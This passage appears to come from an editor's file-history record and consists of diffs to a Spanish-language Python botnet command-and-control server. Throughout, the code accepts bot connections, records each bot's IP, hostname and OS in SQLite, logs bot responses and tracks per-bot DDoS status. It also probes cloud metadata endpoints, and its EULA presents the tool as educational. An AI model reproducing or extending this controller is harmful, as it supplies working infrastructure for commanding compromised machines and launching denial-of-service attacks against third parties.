input(\"[ERROR] No puedes ejecutar este servidor fuera de una red privada. Presione ENTER para cerrar.\")\r\n-            sys.exit(1)\r\n-        verificar_eula(\"servidor\")\r\n-        init_db(config[\"DB_PATH\"])\r\n-        servidor_CnC(config[\"HOST\"], config[\"PORT\"])\r\n-        logging.info(\"Servidor de Comando y Control (C2) iniciado correctamente\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al iniciar el servidor: {e}\")\r\n-\r\n-if __name__ == \"__main__\":\r\n-    try:\r\n-        iniciar_servidor()\r\n-    except Exception as e:\r\n-        logging.error(f\"Error en la ejecuci贸n principal: {e}\")\n-import logging\r\n-import socket\r\n-import sys\r\n-import threading\r\n-import time\r\n-import os\r\n-import ipaddress\r\n-import requests\r\n-import sqlite3\r\n-import configparser\r\n-from datetime import datetime\r\n-\r\n-bots = [] # List de bots\r\n-bot_ids = {} # Diccinario con los IDS de los bots\r\n-sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n-respuestas_bots = {}  # Diccionario para almacenar las 煤ltimas respuestas de los bots\r\n-ddos_status = {}  # Diccionario para almacenar el estado del DDoS en cada bot\r\n-server_running = True  # Variable para controlar el estado del servidor\r\n-\r\n-def configurar_logging(config):\r\n-    \"\"\"\r\n-    Configura el sistema de logging del servidor.\r\n-\r\n-    El nivel de log se establece seg煤n la clave \"LOG_LEVEL\" en el objeto de configuraci贸n.\r\n-    El nivel de log puede ser \"DEBUG\", \"INFO\", \"WARNING\", \"ERROR\" o \"CRITICAL\".\r\n-    Si no se especifica un nivel de log, se establece en \"INFO\" por defecto.\r\n-\r\n-    La ruta del archivo de log se establece seg煤n la clave \"LOG_FILE\" en el objeto de configuraci贸n.\r\n-    La ruta se crea si no existe.\r\n-\r\n-    El formato de los mensajes de log se establece en \"%(asctime)s - %(levelname)s - %(message)s\".\r\n-\r\n-    Los mensajes de log se escriben en el archivo de log y en la consola.\r\n-\r\n+    :param HOST: La direcci贸n IP del servidor.\r\n+    :type HOST: str\r\n+    :param PORT: El puerto de escucha del servidor.\r\n+    :type PORT: int\r\n     :param config: Un objeto con la configuraci贸n del servidor.\r\n-    \"\"\"\r\n-    try:\r\n-        log_level = config[\"LOG_LEVEL\"].upper()\r\n-        log_file = config[\"SERVER_LOG_FILE\"]\r\n-\r\n-        log_levels = {\r\n-            \"DEBUG\": logging.DEBUG,\r\n-            \"INFO\": logging.INFO,\r\n-            \"WARNING\": logging.WARNING,\r\n-            \"ERROR\": logging.ERROR,\r\n-            \"CRITICAL\": logging.CRITICAL\r\n-        }\r\n-        log_level = log_levels.get(log_level, logging.INFO)\r\n-\r\n-        os.makedirs(os.path.dirname(log_file), exist_ok=True)\r\n-\r\n-        logging.basicConfig(\r\n-            level=log_level,\r\n-            format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n-            handlers=[\r\n-                logging.FileHandler(log_file, encoding=\"utf-8\"),\r\n-                logging.StreamHandler(sys.stdout)\r\n-            ]\r\n-        )\r\n-\r\n-        logging.info(\"Sistema de logging configurado correctamente.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al configurar el logging: {e}\")\r\n-\r\n-# Inicializar la base de datos\r\n-def init_db(DB_PATH):\r\n-    \"\"\"\r\n-    Inicializa la base de datos SQLite para almacenar informaci贸n sobre los bots y sus respuestas.\r\n-\r\n-    Crea la carpeta y el archivo de la base de datos si no existe,\r\n-    y crea las tablas \"bots\" y \"respuestas\" si no existen.\r\n-\r\n-    :param DB_PATH: La ruta del archivo de la base de datos.\r\n-    :type DB_PATH: str\r\n-    \"\"\"\r\n-    try:\r\n-        db_dir = os.path.dirname(DB_PATH)\r\n-        if not os.path.exists(db_dir):\r\n-            os.makedirs(db_dir)  # Crear carpeta si no existe\r\n-\r\n-        conn = sqlite3.connect(DB_PATH)\r\n-        cursor = conn.cursor()\r\n-\r\n-        cursor.execute('''CREATE TABLE IF NOT EXISTS bots (\r\n-                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n-                            identificador TEXT UNIQUE,\r\n-                            ip TEXT,\r\n-                            hostname TEXT,\r\n-                            os TEXT,\r\n-                            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP\r\n-                        )''')\r\n-\r\n-        cursor.execute('''CREATE TABLE IF NOT EXISTS respuestas (\r\n-                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n-                            bot_id INTEGER,\r\n-                            respuesta TEXT,\r\n-                            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\r\n-                            FOREIGN KEY (bot_id) REFERENCES bots (id)\r\n-                        )''')\r\n-\r\n-        conn.commit()\r\n-        conn.close()\r\n-        logging.info(\"Base de datos inicializada correctamente.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al inicializar la base de datos: {e}\")\r\n-\r\n-def agregar_respuesta_en_db(config, bot_id, respuesta):\r\n-    \"\"\"\r\n-    Agrega una respuesta de un bot a la base de datos SQLite.\r\n-\r\n-    :param config: Un objeto con la configuraci贸n del servidor.\r\n-    :param bot_id: El ID del bot que envi贸 la respuesta.\r\n-    :type bot_id: int\r\n-    :param respuesta: La respuesta del bot.\r\n-    :type respuesta: str\r\n-    \"\"\"\r\n-    try:\r\n-        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n-        cursor = conn.cursor()\r\n-        cursor.execute(\"INSERT INTO respuestas (bot_id, respuesta, timestamp) VALUES (?, ?, ?)\", (bot_id, respuesta, datetime.now()))\r\n-        conn.commit()\r\n-        conn.close()\r\n-        logging.info(f\"Respuesta del bot {bot_id} agregada a la base de datos.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al agregar la respuesta del bot en la base de datos: {e}\")\r\n-\r\n-def detectarEntornoCloud():\r\n-    \r\n-    \"\"\"\r\n-    Detecta si el entorno actual es un entorno de cloud computing.\r\n-\r\n-    Intenta conectarse a los puntos de metadata de AWS y Google Cloud para \r\n-    determinar si el c贸digo se ejecuta en un entorno de nube. Si se logra \r\n-    conectar exitosamente a cualquiera de estos servicios, se asume que el \r\n-    entorno es un entorno de cloud y se devuelve True. En caso contrario, \r\n-    se devuelve False.\r\n-\r\n-    Returns:\r\n-        bool: True si se ejecuta en un entorno de cloud, False en caso contrario.\r\n-    \"\"\"\r\n-    try:\r\n-        try:\r\n-            # AWS Metadata\r\n-            if requests.get(\"http://169.254.169.254/latest/meta-data/\", timeout=1).status_code == 200:\r\n-                logging.info(\"Entorno de cloud computing detectado.\")\r\n-                return True\r\n-        except requests.exceptions.RequestException:\r\n-            pass\r\n-\r\n-        try:\r\n-            # Google Cloud Metadata\r\n-            if requests.get(\"http://metadata.google.internal/\", timeout=1).status_code == 200:\r\n-                logging.info(\"Entorno de cloud computing detectado.\")\r\n-                return True\r\n-        except requests.exceptions.RequestException:\r\n-            pass\r\n-\r\n-        return False\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al detectar el entorno cloud: {e}\")\r\n-        return False\r\n-\r\n-def esRedPrivada(ip):\r\n-    \"\"\"Indica si una IP es de una red privada o no.\r\n-\r\n-    La funci贸n intenta crear un objeto ipaddress.ip_address() con la IP dada y devuelve\r\n-    el resultado de llamar a su m茅todo is_private(). Si la IP no es v谩lida,\r\n-    devuelve False.\r\n-\r\n-    Parameters:\r\n-    ip (str): La IP a verificar.\r\n-\r\n-    Returns:\r\n-    bool: True si la IP es de una red privada, False si no lo es.\r\n-    \"\"\"\r\n-    try:\r\n-        result = ipaddress.ip_address(ip).is_private\r\n-        logging.info(f\"Verificaci贸n de red privada para la IP: {ip}\")\r\n-        return result\r\n-    except ValueError as e:\r\n-        logging.error(f\"Error al verificar si la IP es privada: {e}\")\r\n-        return False\r\n-\r\n-def verificar_eula(tipo):\r\n-    \"\"\"\r\n-    Verifica si el usuario ha aceptado la licencia antes de ejecutar el programa.\r\n-    \r\n-    :param tipo: \"servidor\" o \"cliente\" para determinar qu茅 EULA verificar.\r\n-    \"\"\"\r\n-    try:\r\n-        if tipo not in [\"servidor\", \"cliente\"]:\r\n-            raise ValueError(\"Tipo de EULA no v谩lido. Debe ser 'servidor' o 'cliente'.\")\r\n-\r\n-        # Ruta para el archivo EULA en la carpeta docs\r\n-        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n-        eula_path = os.path.join(BASE_DIR, \"..\", \"docs\", f\"eula_{tipo}.txt\")\r\n-\r\n-        # Si no existe, lo crea\r\n-        if not os.path.exists(eula_path):\r\n-            with open(eula_path, \"w\") as f:\r\n-                f.write(\"ACCEPTED=False\")\r\n-\r\n-        # Leer si ya acept贸\r\n-        with open(eula_path, \"r\") as f:\r\n-            for linea in f:\r\n-                if \"ACCEPTED=True\" in linea:\r\n-                    logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n-                    return True\r\n-\r\n-        # Mostrar Acuerdo de Licencia\r\n-        print(\"\\n\" + \"=\"*50)\r\n-        print(f\"  ACUERDO DE LICENCIA ({tipo.upper()}) \")\r\n-        print(\"=\"*50)\r\n-        print(\"\\nEste software es exclusivamente para prop贸sitos educativos y de investigaci贸n.\")\r\n-        print(\"El uso en redes ajenas sin autorizaci贸n est谩 prohibido.\")\r\n-        print(\"El usuario debe cumplir con las leyes de su pa铆s.\")\r\n-        print(\"No se permite el uso de este software en redes p煤blicas.\")\r\n-        print(\"El autor no se hace responsable del uso indebido.\\n\")\r\n-        print(\"EL SOFTWARE NO FUNCIONAR FUERA DE UNA RED PRIVADA.\\n\")\r\n-        \r\n-        print(\"  QUEDA TERMINANTEMENTE PROHIBIDO:\")\r\n-        print(\"   - Usarlo con intenciones maliciosas.\")\r\n-        print(\"   - Ejecutarlo en infraestructuras cr铆ticas sin permiso.\")\r\n-        print(\"   - Modificarlo para evadir restricciones.\")\r\n-        print(\"   - Distribuirlo con fines ilegales o comerciales.\\n\")\r\n-        \r\n-        print(\"  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\\n\")\r\n-        \r\n-        respuesta = input(\"Escriba 'ACEPTO' para continuar: \").strip().upper()\r\n-        \r\n-        if respuesta == \"ACEPTO\":\r\n-            with open(eula_path, \"w\") as f:\r\n-                f.write(\"ACCEPTED=True\")\r\n-            logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n-            return True\r\n-        else:\r\n-            print(\"Debe aceptar la licencia para usar este software.\")\r\n-            exit()\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al verificar el EULA: {e}\")\r\n-        exit()\r\n-\r\n-def agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os):\r\n-    \"\"\"\r\n-    Agrega un bot a la base de datos SQLite o actualiza su IP si ya existe.\r\n-\r\n-    :param config: Un objeto con la configuraci贸n del servidor.\r\n-    :param identificador: El identificador 煤nico del bot.\r\n-    :type identificador: str\r\n-    :param ip: La direcci贸n IP del bot.\r\n-    :type ip: str\r\n-    :param hostname: El nombre del host del bot.\r\n-    :type hostname: str\r\n-    :param os: El sistema operativo del bot.\r\n-    :type os: str\r\n-    \"\"\"\r\n-    try:\r\n-        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n-        cursor = conn.cursor()\r\n-        cursor.execute(\"SELECT id FROM bots WHERE identificador = ?\", (identificador,))\r\n-        bot = cursor.fetchone()\r\n-        if bot:\r\n-            cursor.execute(\"UPDATE bots SET ip = ?, hostname = ?, os = ?, last_seen = ? WHERE identificador = ?\", (ip, hostname, os, datetime.now(), identificador))\r\n-            logging.info(f\"Bot actualizado en la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n-        else:\r\n-            cursor.execute(\"INSERT INTO bots (identificador, ip, hostname, os, last_seen) VALUES (?, ?, ?, ?, ?)\", (identificador, ip, hostname, os, datetime.now()))\r\n-            logging.info(f\"Bot agregado a la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n-        conn.commit()\r\n-        conn.close()\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al agregar o actualizar el bot en la base de datos: {e}\")\r\n-\r\n-def manejar_bot(conn, addr, bot_id, config):\r\n-    \"\"\"\r\n-\r\n-        agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os)\r\n-\r\n-        while True:\r\n-            try:\r\n-                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n-                if not data:\r\n-                    continue\r\n-\r\n-                # Guardar la respuesta en el diccionario sin imprimirla\r\n-                respuestas_bots[bot_id] = data\r\n-                actualizar_bot_en_db(config, ip)\r\n-                agregar_respuesta_en_db(config, bot_id, data)\r\n-\r\n-            except socket.timeout:\r\n-                print(f\"Tiempo de espera agotado con {addr}.\")\r\n-            except Exception as e:\r\n-                print(f\"Error con {addr}: {e}\")\r\n-                break\r\n-\r\n-        # Manejo de desconexi贸n\r\n-        conn.close()\r\n-        logging.info(f\"Bot {bot_id} desconectado\")\r\n-        print(f\"Bot {bot_id} desconectado\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al manejar el bot {bot_id}: {e}\")\r\n-    finally:\r\n-        conn.close()\r\n-        logging.info(f\"Bot {bot_id} desconectado\")\r\n-        print(f\"Bot {bot_id} desconectado\")\r\n-\r\n-def servidor_CnC(HOST, PORT):\r\n-    global server_running\r\n-    \"\"\"\r\n-    Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia\r\n-    a la IP y el puerto especificados y lo pone en escucha. Luego, crea un hilo\r\n-    para aceptar conexiones y entra en un bucle para mostrar un men煤 principal\r\n-    que permite al usuario interactuar con los bots conectados.\r\n-\r\n     :return: None\r\n     \"\"\"\r\n     try:\r\n         logging.info(f\"Iniciando servidor CnC en {HOST}:{PORT}\")\r\n@@ -2911,9 +405,9 @@\n         server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto\r\n         server.listen(5) # Escuchar conexiones\r\n         print(f\"Escuchando en {HOST}:{PORT}...\") # Imprimir que el servidor esta escuchando\r\n         \r\n-        threading.Thread(target=aceptar_conexiones, args=(server,)).start() # Crear un hilo para aceptar conexiones\r\n+        threading.Thread(target=aceptar_conexiones, args=(server, config)).start() # Crear un hilo para aceptar conexiones\r\n \r\n         while server_running:\r\n             print(\"\\nMen煤 Principal:\")\r\n             print(\"1. Listar bots conectados\")\r\n@@ -2945,40 +439,8 @@\n                 thread.join()\r\n     except Exception as e:\r\n         logging.error(f\"Error en el servidor CnC: {e}\")\r\n \r\n-def aceptar_conexiones(server):\r\n-    global server_running\r\n-    \"\"\"\r\n-    Acepta conexiones de bots y las asigna a un hilo para manejarlas.\r\n-\r\n-    Este hilo infinito espera conexiones de bots y las asigna a la lista de\r\n-    bots conectados. A cada bot se le asigna un ID 煤nico y se crea un hilo\r\n-    para manejar la conexi贸n. El hilo maneja_bot se encarga de recibir los\r\n-    mensajes del bot, detectar el sistema operativo y ejecutar comandos\r\n-    enviados por el usuario.\r\n-\r\n-    :param server: El socket del servidor C&C.\r\n-    :type server: socket.socket\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Aceptando conexiones de bots\")\r\n-        bot_id = 1 # Contador de bots\r\n-        while server_running:\r\n-            try:\r\n-                conn, addr = server.accept() # Aceptar la conexi贸n\r\n-                bots.append(conn) # Agregar el bot a la lista\r\n-                bot_ids[conn] = bot_id # Asignar el ID del bot\r\n-                threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start() # Crear un hilo para manejar la conexi贸n\r\n-                bot_id += 1 # Incrementar el contador de bots\r\n-            except OSError:\r\n-                if not server_running:\r\n-                    break\r\n-                else:\r\n-                    raise\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al aceptar conexiones: {e}\")\r\n-\r\n def listar_bots():\r\n     \"\"\"\r\n     Muestra la lista de bots conectados al servidor C&C, incluyendo\r\n     su identificador, sistema operativo y direcci贸n IP y puerto de\r\n@@ -3407,9 +869,9 @@\n             input(\"[ERROR] No puedes ejecutar este servidor fuera de una red privada. Presione ENTER para cerrar.\")\r\n             sys.exit(1)\r\n         verificar_eula(\"servidor\")\r\n         init_db(config[\"DB_PATH\"])\r\n-        servidor_CnC(config[\"HOST\"], config[\"PORT\"])\r\n+        servidor_CnC(config[\"HOST\"], config[\"PORT\"], config)\r\n         logging.info(\"Servidor de Comando y Control (C2) iniciado correctamente\")\r\n     except Exception as e:\r\n         logging.error(f\"Error al iniciar el servidor: {e}\")\r\n \r\n"
                },
                {
                    "date": 1740220356095,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -794,11 +794,11 @@\n         try:\r\n             bot.close() # Cerrar la conexi贸n\r\n             print(f\"Conexi贸n con el bot {bot_id} cerrada.\") # Imprimir un mensaje de confirmaci贸n\r\n         except Exception as e:\r\n-            del sistemas_operativos[bot] # Eliminar el SO del bot\r\n+            print(f\"Error al cerrar la conexi贸n con el bot {bot_id}: {e}\")\r\n \r\n-        print(f\"Bot {bot_id} eliminado correctamente del sistema.\")\r\n+        if bot in bots:\r\n     except Exception as e:\r\n         logging.error(f\"Error al cerrar conexi贸n con los bots: {e}\")\r\n \r\n def cargar_configuracion():\r\n"
                },
                {
                    "date": 1740220368369,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,891 @@\n+import logging\r\n+import socket\r\n+import sys\r\n+import threading\r\n+import time\r\n+import os\r\n+import ipaddress\r\n+import requests\r\n+import sqlite3\r\n+import configparser\r\n+from datetime import datetime\r\n+\r\n+bots = [] # List de bots\r\n+bot_ids = {} # Diccinario con los IDS de los bots\r\n+sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n+respuestas_bots = {}  # Diccionario para almacenar las 煤ltimas respuestas de los bots\r\n+ddos_status = {}  # Diccionario para almacenar el estado del DDoS en cada bot\r\n+server_running = True  # Variable para controlar el estado del servidor\r\n+\r\n+def configurar_logging(config):\r\n+    \"\"\"\r\n+    Configura el sistema de logging del servidor.\r\n+\r\n+    El nivel de log se establece seg煤n la clave \"LOG_LEVEL\" en el objeto de configuraci贸n.\r\n+    El nivel de log puede ser \"DEBUG\", \"INFO\", \"WARNING\", \"ERROR\" o \"CRITICAL\".\r\n+    Si no se especifica un nivel de log, se establece en \"INFO\" por defecto.\r\n+\r\n+    La ruta del archivo de log se establece seg煤n la clave \"LOG_FILE\" en el objeto de configuraci贸n.\r\n+    La ruta se crea si no existe.\r\n+\r\n+    El formato de los mensajes de log se establece en \"%(asctime)s - %(levelname)s - %(message)s\".\r\n+\r\n+    Los mensajes de log se escriben en el archivo de log y en la consola.\r\n+\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    \"\"\"\r\n+    try:\r\n+        log_level = config[\"LOG_LEVEL\"].upper()\r\n+        log_file = config[\"SERVER_LOG_FILE\"]\r\n+\r\n+        log_levels = {\r\n+            \"DEBUG\": logging.DEBUG,\r\n+            \"INFO\": logging.INFO,\r\n+            \"WARNING\": logging.WARNING,\r\n+            \"ERROR\": logging.ERROR,\r\n+            \"CRITICAL\": logging.CRITICAL\r\n+        }\r\n+        log_level = log_levels.get(log_level, logging.INFO)\r\n+\r\n+        os.makedirs(os.path.dirname(log_file), exist_ok=True)\r\n+\r\n+        logging.basicConfig(\r\n+            level=log_level,\r\n+            format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n+            handlers=[\r\n+                logging.FileHandler(log_file, encoding=\"utf-8\"),\r\n+                logging.StreamHandler(sys.stdout)\r\n+            ]\r\n+        )\r\n+\r\n+        logging.info(\"Sistema de logging configurado correctamente.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al configurar el logging: {e}\")\r\n+\r\n+# Inicializar la base de datos\r\n+def init_db(DB_PATH):\r\n+    \"\"\"\r\n+    Inicializa la base de datos SQLite para almacenar informaci贸n sobre los bots y sus respuestas.\r\n+\r\n+    Crea la carpeta y el archivo de la base de datos si no existe,\r\n+    y crea las tablas \"bots\" y \"respuestas\" si no existen.\r\n+\r\n+    :param DB_PATH: La ruta del archivo de la base de datos.\r\n+    :type DB_PATH: str\r\n+    \"\"\"\r\n+    try:\r\n+        db_dir = os.path.dirname(DB_PATH)\r\n+        if not os.path.exists(db_dir):\r\n+            os.makedirs(db_dir)  # Crear carpeta si no existe\r\n+\r\n+        conn = sqlite3.connect(DB_PATH)\r\n+        cursor = conn.cursor()\r\n+\r\n+        cursor.execute('''CREATE TABLE IF NOT EXISTS bots (\r\n+                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n+                            identificador TEXT UNIQUE,\r\n+                            ip TEXT,\r\n+                            hostname TEXT,\r\n+                            os TEXT,\r\n+                            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP\r\n+                        )''')\r\n+\r\n+        cursor.execute('''CREATE TABLE IF NOT EXISTS respuestas (\r\n+                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n+                            bot_id INTEGER,\r\n+                            respuesta TEXT,\r\n+                            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\r\n+                            FOREIGN KEY (bot_id) REFERENCES bots (id)\r\n+                        )''')\r\n+\r\n+        conn.commit()\r\n+        conn.close()\r\n+        logging.info(\"Base de datos inicializada correctamente.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al inicializar la base de datos: {e}\")\r\n+\r\n+def agregar_respuesta_en_db(config, bot_id, respuesta):\r\n+    \"\"\"\r\n+    Agrega una respuesta de un bot a la base de datos SQLite.\r\n+\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    :param bot_id: El ID del bot que envi贸 la respuesta.\r\n+    :type bot_id: int\r\n+    :param respuesta: La respuesta del bot.\r\n+    :type respuesta: str\r\n+    \"\"\"\r\n+    try:\r\n+        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n+        cursor = conn.cursor()\r\n+        cursor.execute(\"INSERT INTO respuestas (bot_id, respuesta, timestamp) VALUES (?, ?, ?)\", (bot_id, respuesta, datetime.now()))\r\n+        conn.commit()\r\n+        conn.close()\r\n+        logging.info(f\"Respuesta del bot {bot_id} agregada a la base de datos.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al agregar la respuesta del bot en la base de datos: {e}\")\r\n+\r\n+def detectarEntornoCloud():\r\n+    \r\n+    \"\"\"\r\n+    Detecta si el entorno actual es un entorno de cloud computing.\r\n+\r\n+    Intenta conectarse a los puntos de metadata de AWS y Google Cloud para \r\n+    determinar si el c贸digo se ejecuta en un entorno de nube. Si se logra \r\n+    conectar exitosamente a cualquiera de estos servicios, se asume que el \r\n+    entorno es un entorno de cloud y se devuelve True. En caso contrario, \r\n+    se devuelve False.\r\n+\r\n+    Returns:\r\n+        bool: True si se ejecuta en un entorno de cloud, False en caso contrario.\r\n+    \"\"\"\r\n+    try:\r\n+        try:\r\n+            # AWS Metadata\r\n+            if requests.get(\"http://169.254.169.254/latest/meta-data/\", timeout=1).status_code == 200:\r\n+                logging.info(\"Entorno de cloud computing detectado.\")\r\n+                return True\r\n+        except requests.exceptions.RequestException:\r\n+            pass\r\n+\r\n+        try:\r\n+            # Google Cloud Metadata\r\n+            if requests.get(\"http://metadata.google.internal/\", timeout=1).status_code == 200:\r\n+                logging.info(\"Entorno de cloud computing detectado.\")\r\n+                return True\r\n+        except requests.exceptions.RequestException:\r\n+            pass\r\n+\r\n+        return False\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al detectar el entorno cloud: {e}\")\r\n+        return False\r\n+\r\n+def esRedPrivada(ip):\r\n+    \"\"\"Indica si una IP es de una red privada o no.\r\n+\r\n+    La funci贸n intenta crear un objeto ipaddress.ip_address() con la IP dada y devuelve\r\n+    el resultado de llamar a su m茅todo is_private(). Si la IP no es v谩lida,\r\n+    devuelve False.\r\n+\r\n+    Parameters:\r\n+    ip (str): La IP a verificar.\r\n+\r\n+    Returns:\r\n+    bool: True si la IP es de una red privada, False si no lo es.\r\n+    \"\"\"\r\n+    try:\r\n+        result = ipaddress.ip_address(ip).is_private\r\n+        logging.info(f\"Verificaci贸n de red privada para la IP: {ip}\")\r\n+        return result\r\n+    except ValueError as e:\r\n+        logging.error(f\"Error al verificar si la IP es privada: {e}\")\r\n+        return False\r\n+\r\n+def verificar_eula(tipo):\r\n+    \"\"\"\r\n+    Verifica si el usuario ha aceptado la licencia antes de ejecutar el programa.\r\n+    \r\n+    :param tipo: \"servidor\" o \"cliente\" para determinar qu茅 EULA verificar.\r\n+    \"\"\"\r\n+    try:\r\n+        if tipo not in [\"servidor\", \"cliente\"]:\r\n+            raise ValueError(\"Tipo de EULA no v谩lido. Debe ser 'servidor' o 'cliente'.\")\r\n+\r\n+        # Ruta para el archivo EULA en la carpeta docs\r\n+        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n+        eula_path = os.path.join(BASE_DIR, \"..\", \"docs\", f\"eula_{tipo}.txt\")\r\n+\r\n+        # Si no existe, lo crea\r\n+        if not os.path.exists(eula_path):\r\n+            with open(eula_path, \"w\") as f:\r\n+                f.write(\"ACCEPTED=False\")\r\n+\r\n+        # Leer si ya acept贸\r\n+        with open(eula_path, \"r\") as f:\r\n+            for linea in f:\r\n+                if \"ACCEPTED=True\" in linea:\r\n+                    logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n+                    return True\r\n+\r\n+        # Mostrar Acuerdo de Licencia\r\n+        print(\"\\n\" + \"=\"*50)\r\n+        print(f\"  ACUERDO DE LICENCIA ({tipo.upper()}) \")\r\n+        print(\"=\"*50)\r\n+        print(\"\\nEste software es exclusivamente para prop贸sitos educativos y de investigaci贸n.\")\r\n+        print(\"El uso en redes ajenas sin autorizaci贸n est谩 prohibido.\")\r\n+        print(\"El usuario debe cumplir con las leyes de su pa铆s.\")\r\n+        print(\"No se permite el uso de este software en redes p煤blicas.\")\r\n+        print(\"El autor no se hace responsable del uso indebido.\\n\")\r\n+        print(\"EL SOFTWARE NO FUNCIONAR FUERA DE UNA RED PRIVADA.\\n\")\r\n+        \r\n+        print(\"  QUEDA TERMINANTEMENTE PROHIBIDO:\")\r\n+        print(\"   - Usarlo con intenciones maliciosas.\")\r\n+        print(\"   - Ejecutarlo en infraestructuras cr铆ticas sin permiso.\")\r\n+        print(\"   - Modificarlo para evadir restricciones.\")\r\n+        print(\"   - Distribuirlo con fines ilegales o comerciales.\\n\")\r\n+        \r\n+        print(\"  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\\n\")\r\n+        \r\n+        respuesta = input(\"Escriba 'ACEPTO' para continuar: \").strip().upper()\r\n+        \r\n+        if respuesta == \"ACEPTO\":\r\n+            with open(eula_path, \"w\") as f:\r\n+                f.write(\"ACCEPTED=True\")\r\n+            logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n+            return True\r\n+        else:\r\n+            print(\"Debe aceptar la licencia para usar este software.\")\r\n+            exit()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al verificar el EULA: {e}\")\r\n+        exit()\r\n+\r\n+def adapt_datetime(dt):\r\n+    return dt.strftime(\"%Y-%m-%d %H:%M:%S\")\r\n+\r\n+def convert_datetime(s):\r\n+    return datetime.strptime(s.decode(), \"%Y-%m-%d %H:%M:%S\")\r\n+\r\n+sqlite3.register_adapter(datetime, adapt_datetime)\r\n+sqlite3.register_converter(\"timestamp\", convert_datetime)\r\n+\r\n+def agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os):\r\n+    \"\"\"\r\n+    Agrega un bot a la base de datos SQLite o actualiza su IP si ya existe.\r\n+\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    :param identificador: El identificador 煤nico del bot.\r\n+    :type identificador: str\r\n+    :param ip: La direcci贸n IP del bot.\r\n+    :type ip: str\r\n+    :param hostname: El nombre del host del bot.\r\n+    :type hostname: str\r\n+    :param os: El sistema operativo del bot.\r\n+    :type os: str\r\n+    \"\"\"\r\n+    try:\r\n+        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n+        cursor = conn.cursor()\r\n+        cursor.execute(\"SELECT id FROM bots WHERE identificador = ?\", (identificador,))\r\n+        bot = cursor.fetchone()\r\n+        if bot:\r\n+            cursor.execute(\"UPDATE bots SET ip = ?, hostname = ?, os = ?, last_seen = ? WHERE identificador = ?\", (ip, hostname, os, datetime.now(), identificador))\r\n+            logging.info(f\"Bot actualizado en la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n+        else:\r\n+            cursor.execute(\"INSERT INTO bots (identificador, ip, hostname, os, last_seen) VALUES (?, ?, ?, ?, ?)\", (identificador, ip, hostname, os, datetime.now()))\r\n+            logging.info(f\"Bot agregado a la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n+        conn.commit()\r\n+        conn.close()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al agregar o actualizar el bot en la base de datos: {e}\")\r\n+\r\n+def actualizar_bot_en_db(config, ip):\r\n+    \"\"\"\r\n+    Actualiza la 煤ltima vez visto de un bot en la base de datos SQLite.\r\n+\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    :param ip: La direcci贸n IP del bot.\r\n+    :type ip: str\r\n+    \"\"\"\r\n+    try:\r\n+        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n+        cursor = conn.cursor()\r\n+        cursor.execute(\"UPDATE bots SET last_seen = ? WHERE ip = ?\", (datetime.now(), ip))\r\n+        conn.commit()\r\n+        conn.close()\r\n+        logging.info(f\"Bot actualizado en la base de datos: 